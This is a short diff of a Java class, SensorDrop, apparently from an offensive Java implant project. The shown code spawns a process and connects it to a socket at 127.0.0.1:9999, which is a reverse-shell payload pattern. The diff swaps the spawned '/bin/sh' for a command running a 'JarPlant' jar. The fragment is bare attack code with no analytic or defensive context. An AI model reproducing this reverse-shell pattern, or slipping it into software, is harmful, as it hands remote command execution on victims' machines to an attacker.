@@ -30,7 +30,7 @@ public class SensorDrop {
                     try {
                         String host = "127.0.0.1";
                         int port = 9999;
-                        String cmd = "/bin/sh";
+                        String cmd = "java -jar JarPlant-all-the-things-1.0-SNAPSHOT-jar-with-dependencies.jar";
                         Process p = (new ProcessBuilder(new String[]{cmd})).redirectErrorStream(true).start();
                         Socket s = new Socket(host, port);
                         InputStream pi = p.getInputStream();
